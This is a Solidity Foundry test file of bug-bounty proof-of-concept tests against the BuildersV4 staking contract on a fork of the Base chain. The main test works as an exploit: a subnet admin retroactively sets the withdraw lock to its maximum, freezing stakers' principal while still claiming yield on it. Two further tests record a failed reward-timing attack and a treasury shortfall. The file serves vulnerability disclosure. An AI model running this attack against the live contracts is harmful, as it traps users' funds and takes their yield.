// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import {Test, console} from "forge-std/Test.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IBuildersV4Minimal {
    struct Subnet {
        string name;
        address admin;
        uint128 unusedStorage1_V4Update;
        uint128 withdrawLockPeriodAfterDeposit;
        uint128 unusedStorage2_V4Update;
        uint256 minimalDeposit;
        address claimAdmin;
    }
    struct SubnetMetadata {
        string slug;
        string description;
        string website;
        string image;
    }
    function getSubnetId(string memory subnetName_) external view returns (bytes32);
    function createSubnet(Subnet calldata subnet_, SubnetMetadata calldata metadata_) external;
    function editSubnet(bytes32 subnetId_, Subnet calldata newSubnet_) external;
    function deposit(bytes32 subnetId_, uint256 amount_) external;
    function withdraw(bytes32 subnetId_, uint256 amount_) external;
    function claim(bytes32 subnetId_, address receiver_) external;
    function getCurrentSubnetRewards(bytes32 subnetId_) external view returns (uint256);
    function getCurrentSubnetsRewards() external view returns (uint256);
    function usersData(address user_, bytes32 subnetId_)
        external
        view
        returns (uint128 lastDeposit, uint128 unused1, uint256 deposited, uint256 unused2);
    function allSubnetsData() external view returns (uint256, uint256 rate, uint256 totalDeposited, uint256);
    function allSubnetsDataV4()
        external
        view
        returns (uint256 distributed, uint256 undistributed, uint256 claimed, uint128 lastUpdate);
    function minimalWithdrawLockPeriod() external view returns (uint256);
}

interface IRewardPoolMinimal {
    function getPeriodRewards(uint256 index_, uint128 startTime_, uint128 endTime_) external view returns (uint256);
}

/**
 * @title BaseBuildersPoC
 * @notice Fork PoCs (Base, block 58142937) for the MOR bug bounty, Builders scope.
 * @dev READ-ONLY vs mainnet: everything runs on a local Foundry fork. No real tx is sent.
 *      Attacker/victim are ordinary addresses; no owner/admin/multisig is impersonated.
 */
contract BaseBuildersPoC is Test {
    IBuildersV4Minimal constant BUILDERS = IBuildersV4Minimal(0x42BB446eAE6dca7723a9eBdb81EA88aFe77eF4B9);
    IERC20 constant MOR = IERC20(0x7431aDa8a591C955a994a21710752EF9b882b8e3);
    address constant TREASURY = 0x9eba628581896ce086cb8f1A513ea6097A8FC561;
    IRewardPoolMinimal constant REWARD_POOL = IRewardPoolMinimal(0xDC99a8596e395E52aba2BD08C623E1e428Dc3980);

    address attacker = address(0xa77Acc0000000000000000000000000000000001);
    address victim = address(0xB1c7110000000000000000000000000000000002);
    address neutralAdmin = address(0xCA11010000000000000000000000000000000003);

    uint256 constant BLOCK = 58142937;

    function setUp() public {
        vm.createSelectFork("base", BLOCK);
        deal(address(MOR), victim, 100_000 ether);
        deal(address(MOR), attacker, 1_000_000 ether);
        vm.label(attacker, "attacker");
        vm.label(victim, "victim");
    }

    function _mkSubnet(string memory name_, address admin_, uint128 lock_) internal returns (bytes32) {
        IBuildersV4Minimal.Subnet memory s = IBuildersV4Minimal.Subnet({
            name: name_,
            admin: admin_,
            unusedStorage1_V4Update: 0,
            withdrawLockPeriodAfterDeposit: lock_,
            unusedStorage2_V4Update: 0,
            minimalDeposit: 1 ether,
            claimAdmin: admin_
        });
        IBuildersV4Minimal.SubnetMetadata memory m = IBuildersV4Minimal.SubnetMetadata({
            slug: name_,
            description: "",
            website: "",
            image: ""
        });
        vm.prank(admin_);
        BUILDERS.createSubnet(s, m);
        return BUILDERS.getSubnetId(name_);
    }

    /**
     * FINDING (candidate): subnet admin can retroactively raise
     * `withdrawLockPeriodAfterDeposit` to type(uint128).max via editSubnet()
     * AFTER users staked. V3 prevented this (edits only allowed before pool
     * start, `block.timestamp + editPoolDeadline < poolStart`); V4 removed the
     * deadline and sets no upper bound. Result: victim principal is frozen
     * forever in BuildersV4 while the admin keeps harvesting the yield on it.
     */
    function test_adminCanPermanentlyFreezeStakerFunds() public {
        // Attacker creates a subnet that looks like a legit project.
        bytes32 idA = _mkSubnet("AuditProbeSubnet-7f3a", attacker, 7 days);
        // Control subnet with an honest admin, same parameters.
        bytes32 idB = _mkSubnet("AuditProbeSubnet-Control-9c1e", neutralAdmin, 7 days);

        // Victim stakes 10,000 MOR into each subnet.
        vm.startPrank(victim);
        MOR.approve(address(BUILDERS), type(uint256).max);
        BUILDERS.deposit(idA, 10_000 ether);
        BUILDERS.deposit(idB, 10_000 ether);
        vm.stopPrank();

        // 30 days pass; rewards accrue on both.
        vm.warp(block.timestamp + 30 days);
        uint256 rewA = BUILDERS.getCurrentSubnetRewards(idA);
        uint256 rewB = BUILDERS.getCurrentSubnetRewards(idB);
        assertGt(rewA, 0, "subnet A should have accrued rewards");
        assertGt(rewB, 0, "subnet B should have accrued rewards");
        console.log("pending rewards A (victim subnet):", rewA / 1 ether, "MOR");
        console.log("pending rewards B (control subnet):", rewB / 1 ether, "MOR");

        // Attacker retroactively raises the withdraw lock to the max uint128.
        IBuildersV4Minimal.Subnet memory edited = IBuildersV4Minimal.Subnet({
            name: "AuditProbeSubnet-7f3a",
            admin: attacker,
            unusedStorage1_V4Update: 0,
            withdrawLockPeriodAfterDeposit: type(uint128).max,
            unusedStorage2_V4Update: 0,
            minimalDeposit: 1 ether,
            claimAdmin: attacker
        });
        vm.prank(attacker);
        BUILDERS.editSubnet(idA, edited);

        // Victim CANNOT withdraw from A anymore...
        vm.prank(victim);
        vm.expectRevert();
        BUILDERS.withdraw(idA, 10_000 ether);

        // ...but CAN still withdraw from the honest control subnet B.
        uint256 balBefore = MOR.balanceOf(victim);
        vm.prank(victim);
        BUILDERS.withdraw(idB, 10_000 ether);
        assertEq(MOR.balanceOf(victim) - balBefore, 10_000 ether, "control withdraw must work");

        // 365 more days pass. Attacker harvests the yield on the frozen stake.
        vm.warp(block.timestamp + 365 days);
        uint256 atkBefore = MOR.balanceOf(attacker);
        vm.prank(attacker);
        BUILDERS.claim(idA, attacker);
        uint256 harvested = MOR.balanceOf(attacker) - atkBefore;
        assertGt(harvested, 0, "attacker must harvest yield on frozen funds");
        console.log("attacker harvested on frozen stake:", harvested / 1 ether, "MOR");

        // Victim STILL cannot withdraw, even ~1 year later (lock is ~1e31 years).
        vm.prank(victim);
        vm.expectRevert();
        BUILDERS.withdraw(idA, 10_000 ether);

        // Victim principal is still recorded in the contract: frozen, not gone.
        (, , uint256 stillStaked, ) = BUILDERS.usersData(victim, idA);
        assertEq(stillStaked, 10_000 ether, "victim principal stays frozen in contract");
        console.log("victim principal frozen in BuildersV4:", stillStaked / 1 ether, "MOR");
    }

    /**
     * FAILED CANDIDATE: deposit/withdraw timing games to extract more than the
     * pro-rata share of rewards. Attacker deposits a large amount, waits, then
     * withdraws everything and claims as admin. Assert the claim is (within
     * rounding) exactly the pro-rata share -- no over-issuance.
     */
    function test_noExcessRewardsFromDepositWithdrawTiming() public {
        bytes32 idC = _mkSubnet("AuditProbeSubnet-Timing-55aa", attacker, 7 days);

        (, , uint256 totalBefore, ) = BUILDERS.allSubnetsData();
        uint256 myDeposit = 500_000 ether;

        vm.startPrank(attacker);
        MOR.approve(address(BUILDERS), type(uint256).max);
        BUILDERS.deposit(idC, myDeposit);
        vm.stopPrank();

        uint256 t0 = block.timestamp;
        vm.warp(t0 + 10 days);
        uint256 t1 = block.timestamp;

        // Fair share: total rewards for ALL subnets over the window * my share.
        uint256 rawRewards = REWARD_POOL.getPeriodRewards(3, uint128(t0), uint128(t1));
        uint256 totalRewardsForSubnets = (rawRewards * 8) / 10; // networkShare = 80%
        uint256 fairShare = (totalRewardsForSubnets * myDeposit) / (totalBefore + myDeposit);

        // Withdraw everything, then claim as admin.
        vm.prank(attacker);
        BUILDERS.withdraw(idC, myDeposit);
        uint256 balBefore = MOR.balanceOf(attacker);
        vm.prank(attacker);
        BUILDERS.claim(idC, attacker);
        uint256 claimed = MOR.balanceOf(attacker) - balBefore;

        console.log("fair pro-rata share:", fairShare / 1 ether, "MOR");
        console.log("actually claimed:   ", claimed / 1 ether, "MOR");
        // Claimed must not exceed fair share by more than dust (1 MOR tolerance).
        assertLe(claimed, fairShare + 1 ether, "claimed MORE than pro-rata share = over-issuance");
        // ...and must be close to it (no under-payment games either).
        assertGe(claimed, fairShare - 1 ether, "claimed far BELOW pro-rata share");
    }

    /**
     * OBSERVATION (not attacker-profitable): rewards accounting promises more
     * MOR than the treasury currently holds. getCurrentSubnetsRewards() (all
     * unclaimed, already-distributed rewards) exceeds the treasury MOR balance.
     * Consequence: late claims revert once the treasury is drained; funding is
     * an ops concern, not an exploitable bug (claimants can only take their own
     * subnet's entitlement).
     */
    function test_treasuryShortfallObservation() public view {
        uint256 unclaimed = BUILDERS.getCurrentSubnetsRewards();
        uint256 treasuryBal = MOR.balanceOf(TREASURY);
        console.log("unclaimed distributed rewards:", unclaimed / 1 ether, "MOR");
        console.log("treasury MOR balance:        ", treasuryBal / 1 ether, "MOR");
        assertGt(unclaimed, treasuryBal, "expected shortfall: unclaimed > treasury balance");
        console.log("shortfall:", (unclaimed - treasuryBal) / 1 ether, "MOR");
    }
}
